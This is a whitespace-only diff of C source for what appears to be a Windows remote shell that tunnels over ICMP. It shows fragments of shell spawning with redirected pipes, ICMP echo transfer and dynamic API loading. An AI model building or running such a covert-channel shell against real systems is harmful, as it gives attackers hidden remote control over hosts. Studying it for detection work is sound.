@@ -40,7 +40,6 @@
 FARPROC icmp_create, icmp_send, to_ip;
 
 int verbose = 0;
-
 int spawn_shell(PROCESS_INFORMATION *pi, HANDLE *out_read, HANDLE *in_write)
 {
 	SECURITY_ATTRIBUTES sattr;
@@ -84,7 +83,6 @@ int spawn_shell(PROCESS_INFORMATION *pi, HANDLE *out_read, HANDLE *in_write)
 
 	CloseHandle(out_write);
 	CloseHandle(in_read);
-
 	return STATUS_OK;
 }
 
@@ -115,9 +113,7 @@ int transfer_icmp(HANDLE icmp_chan, unsigned int target, char *out_buf, unsigned
 	int rs;
 	char *temp_in_buf;
 	int nbytes;
-
 	PICMP_ECHO_REPLY echo_reply;
-
 	temp_in_buf = (char *) malloc(max_in_data_size + ICMP_HEADERS_SIZE);
 	if (!temp_in_buf) {
 		return TRANSFER_FAILURE;
@@ -150,14 +146,12 @@ int transfer_icmp(HANDLE icmp_chan, unsigned int target, char *out_buf, unsigned
 		}
 
 		free(temp_in_buf);
-
     return TRANSFER_FAILURE;
 }
 
 int load_deps()
 {
 	HMODULE lib;
-	
 	lib = LoadLibraryA("ws2_32.dll");
 	if (lib != NULL) {
         to_ip = GetProcAddress(lib, "inet_addr");
@@ -185,7 +179,6 @@ int load_deps()
 	}
 	
 	printf("failed to load functions (%u)", GetLastError());
-
 	return 0;
 }
 int main(int argc, char **argv)
@@ -204,7 +197,6 @@ int main(int argc, char **argv)
 	int status;
 	unsigned int max_data_size;
 	struct hostent *he;
-
 
 	// set defaults
 	target = 0;
